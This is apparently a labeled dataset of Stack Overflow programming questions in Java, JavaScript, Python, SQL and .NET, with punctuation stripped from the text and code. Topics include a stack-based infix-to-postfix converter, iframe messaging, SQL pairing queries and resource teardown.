why is it saying stack is empty even though i push something into it   for some reason when i call the stack1.empty() or stack1.isempty()  it returns true even though i pushed something into the stack  here is the method i use to push something into the stack...   <pre><code>//case b:      else if(currentchar ==  ( ){          character charobj = character.valueof( ( );          stack1.push(charobj);          system.out.println( case b );      } </code></pre>   basically it iterates through each character in a string  and does one of the cases that i coded. in this case  the character is a  (   so i have it pushed into the stack.     now  the next character in the string is a letter  so this case is called:   <pre><code>//case a:      if(currentchar !=  +  &amp;&amp; currentchar !=  -  &amp;&amp; currentchar !=  *  &amp;&amp; currentchar !=  /  &amp;&amp; currentchar !=  (  &amp;&amp; currentchar !=  )  ){          postfixstring += currentchar;          system.out.println( case a );      } </code></pre>   that method works fine. now the next part goes wrong for some reason. the next thing in the string is a *. so  it s supposed to run a certain case that i coded  but instead it runs a different case....here is the case that it runs:   <pre><code>//case c:      else if(stack1.empty() &amp;&amp; currentchar ==  +  || currentchar ==  -  || currentchar ==  *  || currentchar ==  / ){          stack1.push(currentchar);          system.out.println( case c );      } </code></pre>   as you can see  the only way to run this case is if the stack <em>is</em> empty  but it s not empty! i pushed something into the stack... i don t understand why it keeps running this case even though the stack is not empty.     i want it to run this case instead:   <pre><code>     //case d: if character is an operator  it goes into a loop checking if topstack is higher precedence to the current character      // if it is  the stack pops onto the end of the postfix string. if it isn t  the stack pushes the current scanned character.      // it then breaks out of the loop      else if(currentchar ==  +  || currentchar ==  -  || currentchar ==  *  || currentchar ==  /  &amp;&amp; !stack1.isempty()){          char topstack = stack1.peek();          while(!stack1.isempty()){             if(precedence(topstack  currentchar)){                 postfixstring += stack1.pop();             }             else{                 stack1.push(currentchar);                 break;             }              system.out.println( case d );          }         } </code></pre>   i mean it should run case d  but instead it runs case c. why is it doing this     edit:    here s the entire class:   <pre><code>import java.util.stack;  public class infixtopostfixconverter { //********************************************************************** //the precedence method determines the precedence between two operators. //if the first operator is of higher or equal precedence than the second //operator  it returns the value true  otherwise it returns false. //***********************************************************************    public static boolean precedence(char topstack  char currentchar)    {    if(topstack == currentchar){        return true;    }     // if topstack is division or multiplication  it will always have precedence no matter what    if(topstack ==  /  || topstack ==  * ){        return true;    }    // if topstack is addition or subtraction...    else if(topstack ==  +  || topstack ==  - ){        if(currentchar ==  +  || currentchar ==  - ){            return true;        }        else if(currentchar ==  *  || currentchar ==  / ){            return false;        }    }     return false;    }  //************************************************************************* //the static converttopostfix method will convert the infixstring //into the corresponding postfix string. check the algorithm on //assignment #11 s description page. mark each case clearly inside the code //*************************************************************************    public static string converttopostfix(string infixstring)    {   //initialize the resulting postfix string   string postfixstring =   ;    //initialize the stack   stack&lt;character&gt; stack1 = new stack&lt;character&gt;();   //obtain the character at index i in the string   for (int i=0; i &lt; infixstring.length(); i++)   {      char currentchar = infixstring.charat(i);      //case a:      if(currentchar !=  +  &amp;&amp; currentchar !=  -  &amp;&amp; currentchar !=  *  &amp;&amp; currentchar !=  /  &amp;&amp; currentchar !=  (  &amp;&amp; currentchar !=  )  ){          postfixstring += currentchar;          system.out.println( case a );      }      //case b:      else if(currentchar ==  ( ){          stack1.push(currentchar);          system.out.println( case b );      }       else if(currentchar ==  +  || currentchar ==  -  || currentchar ==  *  || currentchar ==  / ){          //case c          if(stack1.isempty()){              stack1.push(currentchar);              system.out.println( case c );          }          //case d          else{              char topstack = stack1.peek();               while(!stack1.isempty()){                 if(precedence(topstack  currentchar)){                     postfixstring += stack1.pop();                 }                 else{                     stack1.push(currentchar);                     break;                 }                  system.out.println( case d );              }          }      }     //case e:      else if(currentchar ==  )  &amp;&amp; !stack1.isempty()){          while(!stack1.isempty() &amp;&amp; stack1.peek() !=  ( ){              postfixstring += stack1.pop();              system.out.println( case e );          }          if(!stack1.isempty() &amp;&amp; stack1.peek() ==  ( ){              stack1.pop();          }      }     } //end of for loop       //case f:   if(!stack1.isempty() &amp;&amp; stack1.peek() ==  ( ){       return  no matching close parenthesis error. ;   }   else if(!stack1.isempty() &amp;&amp; stack1.peek() !=  ( ){       while(!stack1.isempty() &amp;&amp; stack1.peek() !=  ( ){           postfixstring += stack1.pop();       }   }    system.out.println( case f );   return postfixstring;   }//end of converttopostfix method  }//end of the infixtopostfixconverter class </code></pre>,java
given a window of an iframe  is there easy access to the owning iframe   i ve been playing around with <em>postmessage</em> just to have a better understanding of how it works  with the following example:    <a href= http://hashcollision.org/tmp/hello-iframe.html  rel= nofollow >http://hashcollision.org/tmp/hello-iframe.html</a>    it s slightly elaborate: for each character in the message  this constructs an iframe sourced to <a href= http://hashcollision.org/tmp/hello-iframe-inner.html  rel= nofollow >http://hashcollision.org/tmp/hello-iframe-inner.html</a>.  i then use postmessage to communicate to each individual iframe  telling it what character to show.  also  the iframes communicate the geometry of the iframe back to the parent page via postmessage too.  it s all quite useless  but it s a cute test page.    one of the things that s currently awkward is  given the window of an iframe  to find the owning iframe.    i m doing a <em>for</em> loop to walk all my iframes and check the window with <em>===</em>  but that seems a bit silly.  are there better ways to do this,javascript

java redeclaring class within itself  i realise that this might be a stupid question  but i have not come across this before. the extract below is declaring a class. but i do not know why or understand why the class is redeclared within it s self.     i am still learning the ins and outs of java so would appreciate any help. also i know i will have probably used incorrect terms as i am unversed in the details of java. please correct my ignorance.   <pre><code>public class touchexampleview extends view {     private drawable micon;     private float mposx;     private float mposy;      private float mlasttouchx;     private float mlasttouchy;      public touchexampleview(context context) {         this(context  null  0);     }      public touchexampleview(context context  attributeset attrs) {         this(context  attrs  0);     }      public touchexampleview(context context  attributeset attrs  int defstyle) {         super(context  attrs  defstyle);         micon = context.getresources().getdrawable(r.drawable.icon);         micon.setbounds(0  0  micon.getintrinsicwidth()  micon.getintrinsicheight());     } </code></pre>,java
should i tear down all resources constructed in __init__   quite often i create classes which internally use some resources like requests sessions  imap connections. i initialize such resources in <code>__init__</code>.    for example:   <pre><code>class someclass:     def __init__(self  login  password):         self.session = requests.session()         self.imap_connection = imaplib.connect(...)         ... and so on ... </code></pre>   so the main question: should i manually free such resources  like sessions  imap_connections or it s quite safe to let them die when the gc runs or it s not safe and if so what is best solution     as i understand besides implementing some <code>free_resources</code> method and invoking it explicitly is to implement <code>__enter__</code> which returns <code>self</code> and an <code>__exit__</code> method which tears all these resources down. then i instantiate these class using a <code>with</code> block.,python

a homework question: is there a way to compare contents in different tables at the same time   the part of the schema is as follows:   <ul> <li><strong>customer</strong> (cid  name  city) (primary key: cid)</li> <li><strong>purchase</strong> (cid  club  title  year  when  qnty) (primary key: cid  club  title  year  when)</li> </ul>   i want to list distinct pairs of customers who have made a purchase of a book (title) in common. for each pair of such customers  show first the one with the larger cid. in the answer table  only report the customers  names. the output columns  names are <code>namea</code> and <code>nameb</code>.     i already list all pairs with different namea and nameb with the same title   <pre><code>select distinct c1.name as namea  c2.name as nameb from purchase p1 join customer as c1 on  c1.cid = p1.cid join purchase p2 on p1.title = p2.title and p1.year = p2.year and p1.cid != p2.cid and p1.cid &lt; p2.cid join customer as c2 on  c2.cid = p2.cid; </code></pre>   in case someone needs the table creation file: <a href= https://www.eecs.yorku.ca/course_archive/2019-20/w/3421n/project/jeopardy/schema/yrb2020-create  rel= nofollow noreferrer >create</a>  the expected return number should be 283  but i keep getting 282 since there are 2 people with the same name.    edited: <br/> there will be two people with the same name  so the output pairs need to be distinct by the <code>cid</code>  not the <code>name</code>. the number of my actual output tuples matches the expected output when i <code>select cid</code>  but it doesn t work when i select names. since customers are identified by the <code>cid</code>  not the <code>name</code>  some customers with the same name will be filtered out if we distinct names. and this is the problem i m working on right now.,sql

how do i stop my count variable incrementing incorrectly in my applet   i am using a button in my applet to add words to a linkedlist. it however is currently not working correctly. it seems like every time the  add word  button is selected it holds the previous number as the count value and is incrementing with the old value instead of just going up in 1 s each time. this is causing the incorrect value to be printed when the search button is selected and the wrong number is outputted. how do i make the count variable hold the correct value despite the number of times  add word  is selected.   <pre><code>import javax.swing.*;

how can i detect if user is using autocomplete on text field   i recently moved to using <code>&lt;a&gt;</code> tags as submit buttons for styling purposes. i have a js plugin i wrote that handles forms and their validation.    to simulate a normal form  where a user hits enter on a text field to submit  i detect enter and submit form on keyup.    the problem is if the user hits enter in an autocomplete dropdown from firefox  for instance  it detects and still tries to submit the form.    any ideas  i might switch to my form handler appending a hidden submit button in the event one is not found for the form....,javascript
index out of range in math function  below is my version of something someone i know was working on for school in java. i wanted to challenge myself with it by choosing a pretty convoluted method and making use of only loops  if statements  and other such elementary python stuff that s learned before things like objects  classes  recursion.     i need to take a number greater than 1 as input  which i limited in this case to a max of 30 just until i get my function working. the function needs to output a number that is the result of finding two numbers that multiply together to produce the original input number (example  3 and 7 for input 21)  whose concatenated digits also give the input number as their product  by making sure that if you multiply each number by the next from left to right successively  you will also produce the original input number.    among all possible outputs this function could give  the function finally chooses the lowest number and gives it as the output. so even if 144 <em>were</em> going to give a successful output number  it wouldn t use the 12  12 pair because the output would be 1212 and there s definitely another pair (such as 2  72) that gives a smaller final output.    <em>examples</em>:   <pre><code>&gt;&gt;&gt; thing(21) 37  &gt;&gt;&gt; thing(144) </code></pre>   probably nothing works  right  so this would return <code>none</code> or <code>false</code> or give the user a failure message.    if it weren t for the rule of the digits of the number resulting from concatenating the pair of numbers having to also produce the input number  the input 144 would return/print 1212. however  because of the rule  1 x 2 x 1 x 2 = 4 and not 144  therefore it doesn t work.    i m getting an error about a string index being out of range.   <pre><code>def thing(n):     list1 = []     list2 = []     calc = false     count = 0     if n &gt; 1 and n &lt; 30:         for x in range(1  n + 1):             for y in range(1  n + 1):                 if (x * y) == n:                     list1.append([x  y])                     for pair in list1:                         digits = str(pair[0]) + str(pair[1])                         holder = int(digits[count])                         while count &lt; (len(digits) - 1):                             holder *= int(digits[count+1])                             count += 1                             if count == len(digits)-1:                                 if holder == n:                                     list2.append(holder)                                     calc = true                                     count = 0                                 else:                                     count = 0     else:         print( input invalid. )     if calc:         print(min(list2))     else:         print( no such number. ) </code></pre>   i am doing this inefficient and convoluted method <strong>on purpose</strong> and consider it training.    but  i will still gladly take suggestions not only for improving this code in its own method  but <em>also</em> suggestions for writing this with far fewer lines in a more high-level way.    it s possible that even using low-level python knowledge to solve this  there s a much shorter way to do it that i ve missed. i know that even in my method  i can probably get it a few lines shorter  maybe one less variable  stuff like that  but so far i ve only been trying to make it work first.    note: i don t come from a math background.

comparing 2 files in python while ignoring comments  is there an easy way to compare 2 files in python while ignoring certain lines  i want to ignore python style comments (a line beginning with #) and check if all other lines are the same. i guess there s always reading the file line by line and manually comparing.,python
how do you convert pseudo-code into sql statements   i am taking the free stanford database course online.  i don t have any db experience  but have many years of os programming experience.  typically  i will flowchart or write out pseudo-code for a particular algorithm before coding it up.  i was wondering if this technique can be used to go from a flowchart or pseudo-code into sql statements.    does a loop that iterates over a set match a where clause   is this mostly( ) or always( ) true     how would you map a doubly nested loop into sql,sql

flask on vps redirects to 127.0.0.1 instead of the vps  ip address  i am currently working on a small program for my school and ran into a small problem with my flask program. basically  i put my program on my ec2 vps and whenever i use return #do something it will go to 127.0.0.1/webpage instead of the vps  ip address  this only happens when the program is running on the vps. any ideas on how to fix this issue     the following code is the code i am using to run the flask program.   <pre><code>if __name__ ==  __main__ :     app.run(host= 0.0.0.0   port=80) </code></pre>,python

is it possible to nest the all function   i have a list of objects named <em>items</em>. each object has a property <em>state</em> and a property <em>children</em>  which is another list of objects. and each child object has also a property named <em>state</em>. what i want to know is if every item and their children are in the states <em>happy</em> or <em>cheerful</em>.    i did this with all (only analysing the states of the items):   <pre><code>if all(item.state in [ happy    cheerful ] for item in items):    pass </code></pre>   i would like to know which is the best way to do the same with not only items but children too.,python
is it possible to alter one frame from another using javascript   ok  there have been a lot of discussions on this topic  but i haven t quite found an answer (see <a href= https://stackoverflow.com/questions/5660116/unsafe-javascript-attempt-to-access-frame-in-google-chrome >unsafe javascript attempt to access frame in google chrome</a>  <a href= https://stackoverflow.com/questions/4324108/unsafe-javascript-attempt-to-access-frame-with-url >unsafe javascript attempt to access frame with url</a> for example).    here s my situation:    i ve got a file called index.html that looks like this:   <pre><code>&lt;frameset&gt;    &lt;frame src= a &gt;    &lt;frame src= b &gt; &lt;/frameset&gt; </code></pre>   then  a  looks like this:   <pre><code>&lt;script language= javascript &gt;document.domain = document.domain&lt;/script&gt; &lt;img src= whatever.jpg  id= foo /&gt; </code></pre>   and  b  looks like this:   <pre><code>&lt;script language= javascript &gt; &lt;!-- settimeout(function() { document.domain=document.domain document.write( top domain is   + document.domain)   document.domain = document.domain   top.a.document.images[ foo ].src =  something.jpg  }  (5 * 1000)); //--&gt; &lt;/script&gt; </code></pre>   so in a nutshell: a is a frame with a single image in it. b is a frame that should automatically change the src attribute of a s image link. but chrome is unhappy!    (note that i added the  document.domain=document.domain  lines pursuant to comments below).    (also  note that the 5 second delay in frame  b  is necessary to get a valid-looking url for the call.)    according to the chrome js debugger  this is causing a  unsafe javascript attempt to access url . based on the other discussions of this error on stack overflow  it s unclear to me if there are any conditions under which i m allowed to do this. these files (index  a  b) are entirely local on my machine. so there shouldn t be any concerns about them coming from different domains.    any ideas  sorry for re-posting  but i ve quite found a definitive answer...,javascript
how to remove item from the following data type in python   if i have the following data type:   <pre><code>[( a    digital-text )  ( b    bbbbbbb )  ( c    1318913293 )  ( d    1-3 )] </code></pre>   how to i remove item <code>b</code> so the output will look like:   <pre><code>[( a    digital-text )  ( c    1318913293 )  ( d    1-3 )] </code></pre>   how do i also check if <code>b</code> exists before deleting it  i tried <code>if  b  in xxxx</code> but this can t find it    i am new to python,python
what s the best way to create empty/default rows for missing aggregations  i have a table i want to group over two levels. as the output  i need all the grouping value combinations  such that i end up with zeros where non existant combinations occur. for example  say i have this table:    <pre><code>+------+------+ | user | page | +------+------+ | a    |    1 | | a    |    1 | | a    |    2 | | b    |    2 | | b    |    3 | +------+------+ </code></pre>   i m after output like this:   <pre><code>+------+------+--------+ | user | page | visits | +------+------+--------+ | a    |    1 |      2 | | a    |    2 |      1 | | a    |    3 |      0 | | b    |    1 |      0 | | b    |    2 |      1 | | b    |    3 |      1 | +------+------+--------+ </code></pre>   i can achieve this with the following query  but it seems rather heavy handed:    <pre><code>with      users as (select distinct(user) from sometable)      pages as (select distinct(page) from sometable)      users_pages_empty as (select * from users cross join pages)      users_pages_full as (select user  page  count(*) as visits from sometable group by user  page) select e.user  e.page  coalesce(f.visits  0) as visits  from users_pages_empty e  left join users_pages_full f on e.user=f.user and e.page=f.page </code></pre>   i happen to be using aws athena  but i think this is more a generic sql question than an athena question.    the performance of this query is fine  it s more the readability/complexity i m not happy with.,sql
finding differences between row in different table with same key  i have two tables  that are rather large (about 40 columns)  they are filled with mainly integer values  from calculation results. one table is the result of the most recent calculation run  and the other is a stored historical calculation for history. both tables have the same primary key values.    does anyone know if it possible to to compare these tables  based on primary key  for differences  - or also for exact matches  i realise that i could compare every single column  but with 40 columns  thats a long statement and easy to make mistakes if i need to come back and change something later.    for  examples sake (with just 5 columns) i could:   <pre><code>select * from kalk_results inner join kalk_history on kalk_results.id1 = kalk_history.id1 and kalk_results.id2 = kalk_history.id2 where kalk_results.result_1 &lt;&gt; kalk_history.result_1 or kalk_results.result_2 &lt;&gt; kalk_history.result_2 or kalk_results.result_3 &lt;&gt; kalk_history.result_3 or kalk_results.result_4 &lt;&gt; kalk_history.result_4 or kalk_results.result_5 &lt;&gt; kalk_history.result_5 </code></pre>,sql

representing a set of urls in a list as a tree structure  i have a list of dicts that stores urls. it has simply two fields  <code>title</code> and <code>url</code>. example:   <pre><code>[   { title :  index page    url :  http://www.example.com/something/index.htm }     { title :  other page    url :  http://www.example.com/something/other.htm }    { title :  about page    url :  http://www.example.com/thatthing/about.htm }    { title :  detail page    url :  http://www.example.com/something/thisthing/detail.htm }  ] </code></pre>   however  i d to get a tree structure from this list of dicts. i m looking for something like this:   <pre><code>{  www.example.com :    [      {  something :        [          {  thisthing :           [             {  title :  detail page    url :  detail.htm }           ]         }          [           {  title :  index page    url :  index.htm }            {  title :  other page    url :  other.htm }         ]       ]     }      {  thatthing :        [          {  title :  about page    url :  about.htm }       ]     }   ] } </code></pre>   my first attempt at this would be a urlparse soup in a bunch of for loops and i m confident that there s a better and faster way to do this.    i ve seen people on so work magic with list comprehensions  lambda functions  etc. i m still in the process of figuring it out.

how does your company deploy its software   i am currently on a short research project. the company i work at has a very heavy release process that is getting worse as time progresses. we are encountering more and more issues with each release  which is starting to severely impact our delivery schedules and the quality of each release. we provide a large saas product that is deployed to the internet on a very large web farm. our deployment process is currently handled by a dedicated team  with minimal developer involvement. we are primarily a .net shop  however we have a couple java components as well.    i am researching how we could improve our qa and deployment process to reduce waste and bring more of the process under the wing of our dev teams. i am interested in hearing about how your company deploys your products (preferably saas  but not limited to such products) to production  as well as the journey through testing on its way there. i am curious what has worked  and what hasn t  and i m sure many of you have stories to tell.    <strong>edit (additional rfc):</strong>    as i have continued my research  i came across the concept of  continuous deployment   apparently pioneered by the imvu 3d online community team. it sounds like an intriguing concept  if perhaps a little complex. i am curious if anyone here on so has any experience with continuous deployment  particularly with a large  complex project that has many parts to it. you don t necessarily have to continually deploy to production...for our short-term needs  we would only look at continuous deployment to internal dev/qa/perftest environments. if anyone has implemented continuous deployment  i am also curious to hear how you managed database schema and data changes/rollbacks.     thanks!,.net
systemconfiguration.dll. is part of the 2.0 or 3.5 framework   i have a .net 3.5 c# console app. i need to read the app.config. when i go to set a reference to system.configuration.dll  i saw that even though my app was compiled as version 3.5 of the framework  that the add ref dialog only showed me the 2.0 version of the dll.    so i found the dll under:    c:\program files\reference assemblies\microsoft\framework.netframework\v3.5\profile\client    i decided to try and set a reference directly to this 3.5 dll. after doing this  my project ended up with a 2.0 version.    what is going on  i thought that if an app was compiled against a particular version of the framework  that all of the dlls that were part of the framework were all from the same version. it seems like i am mixing versions. i guess i am not too surprised that i can simultaneously access dlls from older versions of the framework  but if there is a newer version in the 3.5 folder  why is it not using it  or is this really the 2.0 dll placed in the 3.5 folder     <img src= https://i.stack.imgur.com/tbbpj.png  alt= enter image description here >,.net

how to avoid errors when manipulating unknown object/function input  when handling user input (in a js library  not form text)  it s easy to throw type-related errors  when a user supplies a non-function and you expected a function for instance. suppose i have a function <code>callfn</code> that takes a function and arguments to supply to it and evaluates the function or returns null if it fails to  i can either use try-catch or simply check that the input is a function before calling:   <pre><code>callfn(fn  args) {     return fn instanceof function   fn.apply(window  args) : null; } //vs callfn(fn  args) {     var ret = null;     try {         ret = fn.apply(window  args);     }     catch (e) {         console.error(e) //still display error for debugging     }     return ret; } </code></pre>   what are the advantages and disadvantages of both ways  am i correct in the following:   <ul> <li>try-catch is slower  but not significantly so</li> <li>try-catch can prevent optimization (see <a href= https://stackoverflow.com/questions/19727905/in-javascript-is-it-expensive-to-use-try-catch-blocks-even-if-an-exception-is-n >in javascript  is it expensive to use try-catch blocks even if an exception is never thrown </a>  not sure if this still applies  can t find anything more recent)</li> <li>try-catch will also handle any errors in the supplied function  which can be advantageous or disadvantageous depending on context</li> </ul>   any the biggest one and why i m considering switching to try-catch   <ul> <li>if the user supplies an object with 10+ fields and many of those fields are functions to evaluate or objects to access  a single try-catch statement will suffice if the function returns the same for any error  but the error preventing way would have to 10 - 20 <code>instanceof</code>/<code>typeof</code> statements; thus try-catch is much more readable (and faster to write).</li> </ul>   i m asking since i hardly ever see try-catch  and was unsure if there is a better (good) reason for it to be bad practice.,javascript

cast object to interface did not implement   first i know this is quite dirty job  and if there is a way  it may be consider  bad practice . unfortunately  i have to explore the possibility.     i would like to know if i can cast an object that in practice implements a interface but in fact do not. i mean  the class implements all the methods but do not have the  implement interface  in the declaration. additionally  i would prefer to do this and finally get the object typed. example below   <pre><code>interface ia{ void method(); }  class cb{      void method(){;}  }  public class foo{     public static void main(string[] args){     /*magic to cast the object without exception*/     ia ob= (ia) new cb();      ob.method();      } } </code></pre>   i want to get this ia object at the end.,java
using pairs in java for database names and values  i am trying to create a generic database function to populate default values into a table on creation if need be. i have a class which will create pairs  thanks to this <a href= https://stackoverflow.com/questions/521171/a-java-collection-of-value-pairs-tuples >post</a> but don t quite understand how it works! :(    i believe i would create something like this for the pairs:   <pre><code>public class dbcolumnvaluepair&lt;t  v&gt; {     private final t column;     private final v value;  public dbcolumnvaluepair(t column  v value) {     this.column = column;     this.value = value; }  public t getcolumn() {     return column; }  public v getvalue() {     return value; }  @override public int hashcode() {      return this.column.hashcode() ^ this.value.hashcode(); }  @override public boolean equals(object o) {     if (o == null)     {         return false;     }     if (!(o instanceof dbcolumnvaluepair))     {         return false;     }     dbcolumnvaluepair dbcvpobject = (dbcolumnvaluepair) o;     return this.column.equals(dbcvpobject.getcolumn())             &amp;&amp; this.value.equals(dbcvpobject.getvalue()); }  } </code></pre>   then populate an array with these pairs  then send this to the method i want to handle the default values.    so my question is how do i populate the pairs in the first place  and would an array of pairs be the way to send them to the handler method     hope you can help :),java

postgresql + python: close connection  i made a game server in python that connects to a postgresql db using psycopg2. i have seen examples  i have seen that when a connection to a data base is created  should close the connection when finished making queries  eg for each client:   <pre><code>#create connection to db con = psycopg2.connect (database =  testdb   user =  janbodnar ) cur = con.cursor () #process query . . . #close connection con.close () </code></pre>   ok  when i start my server  i have this:    inside my class   <pre><code>def __init __ (self):       #create connection to db       con = psycopg2.connect (database =  testdb   user =  janbodnar )       cur = con.cursor ()  # to all customers ... def query(self):       #process query  for example ...       cur.execute ( drop table if exists cars )       #the connection never closes </code></pre>   that is  i use the same connection object for all inquiries from all customers and never close the connection this looks better than to be opening and closing connections for each client  my server apparently works well. you think of this   this well done  not to do . thank you,python

create 32-bit exe s from python code on 64-bit machine  i have already created a 64-bit program for windows using cx freeze on a 64-bit machine. i am using windows 7 64-bit home premium. py2exe is not working because as i understand it does not work with python 3.2.2 yet. is there an option i have to specify in cx freeze to compile in 32-bit instead of 64-bit.    thanks!,python

how shared assembly is different from private assembly   per definition  a private assembly is normally used by a single application  and is stored in the application s directory  or a sub-directory beneath. and a shared assembly is normally stored in the global assembly cache  which is a repository of assemblies maintained by the .net runtime. shared assemblies are usually libraries of code  which many applications will find useful  e.g. crystal report classes that will be used by all application for reports.    as per above definition  the gac registration is not required for a shared assembly  but generally we do gaca  also there is a situation that we can keep a assembly in a local network and multiple application use the same assembly  can we say that assembly as  a shared assembly     how shared assembly is different from private assembly,.net

going in the right direction for a data structures class project   having an issue programming the event handling of this class.  do not understand how to implement it in the gui class.  this is not an graded assignment or has to be handed in.  this is simply some independent exercises to help with java coding.  here is some description of the problem asked:    <strong>create a java gui program which has one button  one text box and one textfield. when a user click on the button  the system should pop up a file selection window  which allows the user to select a file from the hard disk. after the file is selected  e.g.  “ssn.txt”  your program should read input file “ssn.txt”. inside the file each line represents a social security number. the program first read all the ssns into the memory. if the format of a ssn is wrong in the file  your program should throw a ssnexception object  and catch that exception object  and display an error message for that line in text box.</strong>      here is some of my code:   <pre><code>public class ssn_gui extends jpanel implements actionlistener{      public ssn_gui(){      makeobject();     dothelayout();     thebutton.addactionlistener(this);      }     private jtextfield inputssn;     private jbutton thebutton;       //make all the objects     private void makeobject(){          inputssn = new jtextfield(15);         inputssn.seteditable(true);         thebutton = new jbutton();          }      //layout all the objects     private void dothelayout(){          jpanel thepanel = new jpanel();         thepanel.setlayout(new borderlayout());         thepanel.add(new jlabel( enter social security number:  ));         thepanel.add(inputssn   center );         thepanel.add(thebutton   north );     }      // handle the button push     public void actionperformed(actionevent evt){     }   } </code></pre>,java

byte and short data types in java can accept the value outside the range by explicit cast. the higher data types however can not. why   let s consider the following expressions in java.   <pre><code>byte a = 32; byte b = (byte) 250; int i = a + b; </code></pre>   this is valid in java even though the expression <code>byte b = (byte) 250;</code> is forced to assign the value 250 to <code>b</code> which is outside the range of the type <strong>byte</strong>. therefore  b is assigned <strong>-6</strong> and consequently <code>i</code> is assigned the value <strong>26</strong> through the statement <code>int i = a + b;</code>.   <hr>   the same thing is possible with <em>short</em> as follows.   <pre><code>short s1=(short) 567889999; </code></pre>   although the specified value is outside the range of <em>short</em>  this statement is legal.   <hr>   the same thing is however wrong with higher data types such int  double  folat etc and hence  the following case is invalid and causes a compile-time error.   <pre><code>int z=2147483648; </code></pre>   this is illegal  since the range of <em>int</em> in java is from <strong>-2 147 483 648</strong> to <strong>2147483647</strong> which the above statement exceeds and issues a compile-time error. why is such not wrong with <em>byte</em> and <em>short</em> data types in java,java

intermittent event code 3005 error vs 2010 express vb.net  i have a vb.net app that works fine on my development machine  but generates an intermittent error on my server. the event log is below (sorry if this is more than what needs to be posted  but one of my problems is interpreting the event log).     it appears that the error occurs on the server when two or more people simultaneously run the web app. often it looks like it is hung and then times out. then if i try to go back to run the app  i get the error below until i restart the website on the server. so far  no problems if only one person is running the app. my server vendor indicates that this indicates it is an app error (as opposed to memory  server  etc). the app grabs input data  queries several ms access databases (using adodb) and returns some values thru ajax. it is a fairly intensive calcs app that takes several seconds to run.     i know i should provide the code where the error is generated  but my first problem is that i am not sure how to read the event log. <strong>where is this telling me that the error event occurs </strong> i assume that it has something to do with hitting the database     currently  it is only reading data  so i am assuming it can t be that the database gets locked somehow  i don t believe i ever have more than one connection open or more than one recordset open and that i open/close with each database query (again  it works on the dev machine). so it seems like it must have something to do with multiple users     <strong>in general  i assumed i don t need to worry about people hitting the database or the app simultaneously  or is this expected  ie do i need to always have a try/catch around the offending code (as soon as i figure out what code is offending) to catch these errors </strong>    also  i don t know if this is normal or related to the problem - the event log shows paths that are not from the server  but from my development machine (those that start with c:\myfiles...). how does the server know those paths  is this something that is stored in the binary dlls that get uploaded to the server     again  i apologize in advance if i missed providing more info. but maybe these preliminary questions can get me closer to the source of the problem. this seems like a useful forum.    thanks in advance  chuck    <em>note: some of the ip addresses have been masked</em>   <pre><code>log name:      application source:        asp.net 4.0.30319.0 date:          8/6/2013 2:48:00 pm event id:      1309 task category: web event level:         warning keywords:      classic user:          n/a computer:      358797-web1 description: event code: 3005  event message: an unhandled exception has occurred. event time: 8/6/2013 2:48:00 pm   event time (utc): 8/6/2013 7:48:00 pm   event id: ca3280fb485345c194349a42e6e81a85   event sequence: 66   event occurrence: 11   event detail code: 0    application information:   application domain: /lm/w3svc/12/root-1-130202909916484475   trust level: full   application virtual path: /   application path: c:\inetpub-illustrations\wwwroot\   machine name: 358797-web1    process information:   process id: 760   process name: w3wp.exe   account name: nt authority\system    exception information:   exception type: comexception   exception message: operation is not allowed when the object is open.     at adodb.connectionclass.set_connectionstring(string pbstr)    at clscalc_illustrationvalues.mod_dllutilities.util_openmydbconnection(string&amp;

sql - properties structure  what is the best way to setup this table structure.    i have 3 tables  one table we ll call fruit and the other two tables are properties of that fruit so fruit_detailed and fruit_basic.   <h2>fruit</h2>   id | isdetailed   <h2>fruit_detailed</h2>   id | price | color | source | weight | fruitid    <h2>fruit_basic</h2>   id | value | fruitid     so what i want to do is have a property in fruit called isdetailed and if true  fill the fruit_detailed table with properties like color  weight  source  etc (multiple column). if its false then store in fruit_basic table with properties written in a single row.    storage sounds quite basic but if i want to select a fruit and get its properties  how can i determine which table to join  i could use and if statement on the isdetailed property and then join like that but then you have two different types of properties coming back    how would you create the tables or do the join to get the properties  am i missing something,sql

javascript for loop to set attribute <ol> <li> i have several <code>&lt;input&gt;</code> tags. i want to change the type to number if it is <code>type= text </code> so i make a loop function but that doesn t work and no error appears.    (i don t know how to make it change from <code>&lt;input type= text &gt;</code> to <code>&lt;input type= number &gt;</code> when i load this page because there are many tags so i think it s fast to use <code>for</code> loop )   <pre><code>var a=document.getelementsbytagname( input )[i].getattribute( type ); function setvalue(){     for(i=0;i&lt;a.length;i++){         var b=document.getelementsbytagname( input )[i]         if (a= text ){             b.setattribute( text   number );         }     } } </code></pre></li> <li> i have several <code>&lt;select&gt;</code> tags in other page  which looks like <code>&lt;select id= inp_015 &gt; &lt;select id= inp_025 &gt;... &lt;select id= inp_105 &gt;..&lt;select id= inp_205 &gt;</code> the last number is 5 and the front is from 01 to 20) i want to change its width. i made some code below but also don t work.   <pre><code>for(i=0;i&lt;3;i++){     for(i=1;y&lt;10;i++){         document.getelementbyid( inp_ + i + y + 5 ).style.width= 125px ;     } } </code></pre></li> </ol>  <hr>   editted   <pre><code>function setwidth(){     for(i=0;i&lt;3;i++){     for(y=1;y&lt;10;i++){     document.getelementbyid( inp_ +i+y+ 5 ).style.width= 125px ; }}} </code></pre>   (my script was put at the bottom of the body tag) i hope i can get to know which part went wrong.,javascript
why does the .net framework tend to use  int  instead of unsigned integers   there are many places in the .net framework where int seems to be used instead of uint where one would never expect a negative number.    for example .take() in linq takes an integer. port in ipendpoint or other network classes is a signed integer. and so on.    is there a reason for this  loose  typing,.net

how easy is it to reverse engineer .net obfuscated code   there are a few programs on the market that you can use to obfuscate your .net code  my question is  how easy is it for someone to get at your ip if your code is  so called  obfuscated.     is obfuscating .net code merely rubber chicken security  or is it good enough to really protect your intellectual property rights,.net
sql server ignore update errors  i have inherited a very old database that needs some data to be updated. each row ha a column with a uniqueid that looks like c0042-45-39612. the last 3 numbers of the code are the category id (in this case 612).     i need to do an update that targets only certain categories and i m using this sql statement   <pre><code>update webbikesproducts set price = price * 1.05 where convert( integer  substring( uniqueid  3  3 )) = 125 </code></pre>   the obvious problem here is what if the unique code doesn t have 3 numbers at the end  well that s exactly the problem i have as not all the items are categorized or have unique numbers like c0049-307-1chrome.     i don t have access to the db (i m calling this from an asp page) so i d prefer not to have to create a stored procedure. the db is sql 2000.    is there any way to ignore the rows with errors and carry on updating the other rows,sql

